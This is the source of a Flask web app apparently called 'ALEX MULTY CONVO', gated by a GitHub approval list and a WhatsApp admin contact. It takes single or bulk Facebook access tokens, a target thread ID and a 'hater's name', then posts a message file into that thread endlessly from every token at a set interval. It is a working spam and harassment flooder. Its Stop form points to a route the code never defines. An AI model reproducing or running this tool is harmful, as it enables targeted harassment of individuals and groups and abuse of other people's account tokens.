from flask import Flask, request, render_template_string, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string
import os
import hashlib

app = Flask(__name__)

# GitHub Approval List URL
GITHUB_APPROVAL_URL = "https://github.com/Malikkhan7/Alex_cheking/blob/main/approved.txt"

# Admin WhatsApp Number
ADMIN_WHATSAPP_NUMBER = "+9779824204204"

# Store running tasks and stop events
stop_events = {}
threads = {}

# Generate Unique Key
def get_unique_id():
    try:
        unique_str = str(os.getuid()) + os.getlogin() if os.name != 'nt' else os.getlogin()
        return hashlib.sha256(unique_str.encode()).hexdigest()
    except:
        return "ERROR_GENERATING_KEY"

# Check User Approval
def check_permission(unique_key):
    try:
        response = requests.get(GITHUB_APPROVAL_URL)
        return unique_key in response.text if response.status_code == 200 else False
    except:
        return False

# Message Sending Function
def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id, last_name):
    stop_event = stop_events[task_id]
    message_number = 1

    while not stop_event.is_set():
        for message in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v17.0/me'
                try:
                    response = requests.get(api_url, params={'access_token': access_token})
                    account_name = response.json().get('name', 'Unknown') if response.status_code == 200 else 'Unknown'
                except:
                    account_name = 'Unknown'

                formatted_message = f"{mn} {message} {last_name}"
                send_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                parameters = {'access_token': access_token, 'message': formatted_message}

                try:
                    response = requests.post(send_url, data=parameters)
                    print(f"✅ Message {message_number} Sent by {account_name} in Thread {thread_id}: {formatted_message}")
                except:
                    print(f"⚠️ Error Sending Message {message_number}")

                message_number += 1
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def home():
    unique_key = get_unique_id()
    if not check_permission(unique_key):
        return render_template_string(approval_page, unique_key=unique_key, admin_whatsapp_number=ADMIN_WHATSAPP_NUMBER)
    return redirect(url_for('congratulations'))

@app.route('/congrats')
def congratulations():
    return render_template_string(congratulations_page)

@app.route('/send', methods=['GET', 'POST'])
def send_message():
    unique_key = get_unique_id()
    if not check_permission(unique_key):
        return redirect(url_for('home'))

    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        access_tokens = [request.form.get('singleToken')] if token_option == 'single' else request.files['tokenFile'].read().decode().strip().splitlines()
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        last_name = request.form.get('lastName')

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id, last_name))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string(message_sender_page)

# HTML TEMPLATES

approval_page = """
<!DOCTYPE html>
<html>
<head>
  <title>Approval Required</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background: #121212; color: white; text-align: center; padding-top: 50px; }
    .container { max-width: 400px; background: #1e1e1e; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px white; }
    .key-box { word-wrap: break-word; background: #333; padding: 10px; border-radius: 5px; }
  </style>
</head>
<body>
  <h2>Approval Needed</h2>
  <div class="container">
    <p>Your Unique Key:</p>
    <div class="key-box"><strong>{{ unique_key }}</strong></div>
    <br>
    <a href="https://wa.me/{{ admin_whatsapp_number }}?text=Approval%20Request:%20{{ unique_key }}" class="btn btn-success">Request Approval</a>
  </div>
</body>
</html>
"""

congratulations_page = """
<!DOCTYPE html>
<html>
<head>
  <title>Congratulations</title>
  <meta http-equiv="refresh" content="5;url=/send">
  <style> 
    body { background: #121212; color: white; text-align: center; padding-top: 100px; } 
  </style>
</head>
<body>
  <h2>✅ Congratulations! You are Approved!</h2>
  <p>Redirecting to Message Sender in 5 seconds...</p>
</body>
</html>
"""

message_sender_page = """


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝗔𝗟𝗘𝗫 𝐌𝐔𝐋𝐓𝐘 𝐂𝐎𝐍𝐕𝐎</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */
    label { color: white; }
    .file { height: 30px; }
    body {
      background-color: black; /* Optional: to make the video stand out */
    }
    .video-background {
      position: fixed;
      top: 50%;
      left: 50%;
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: translate(-50%, -50%);
      z-index: -1;
    }
    .container {
      max-width: 350px;
      height: auto;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      border: none;
      color: white;
    }
    .form-control {
      outline: 1px red;
      border: 1px double white;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      display: inline-block;
      color: white;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
  </style>
</head>
<body>
    <video id="bg-video" class="video-background" loop autoplay muted>
        <source src="https://raw.githubusercontent.com/HassanRajput0/Video/main/lv_0_20241003034048.mp4">
        Your browser does not support the video tag.
    </video>
<body>
  <header class="header mt-4">
    <h1 class="mt-3 text-white">♛༈𝗔𝗟𝗘𝗫 𝗫𝗗༈♛</h1> </header>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">ՏᎬᏞᎬᏟͲ ͲϴᏦᎬΝ ϴᏢͲᏆϴΝ</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Multy Token</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">ᎬΝͲᎬᎡ ՏᏆΝᏀᏞᎬ ͲϴᏦᎬΝ</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">ᎬΝͲᎬᎡ ͲϴᏦᎬΝ ҒᏆᎬ</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">ᎬΝͲᎬᎡ ᏀᎡϴႮᏢ/ᏆΝᏴϴХ ᏞᏆΝᏦ</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">ᎬΝͲᎬᎡ ᎻᎪͲᎬᎡ'Տ ΝᎪᎷᎬ</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">ᎬΝͲᎬᎡ ͲᏆᎷᎬ ᏆΝ (ՏᎬᏟ)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">ᎬΝͲᎬᎡ ͲᎬХͲ ҒᏆᏞᎬ</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Run</button>
    </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">ᎬΝͲᎬᎡ ͲᎪՏᏦ ᏆᎠ Ͳϴ ՏͲϴᏢ</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
    </form>
  </div>
  <footer class="footer">
    <p>© 2025 ᴄᴏᴅᴇ ʙʏ :- ᴀʟᴇxxᴅ</p>
    <p> ꜰᴀᴛʜᴇʀ ᴏꜰꜰ ᴀʟʟ ʜᴇᴀᴛᴇʀ <a href="">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
    <div class="mb-3">
      <a href="+9779824204204" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
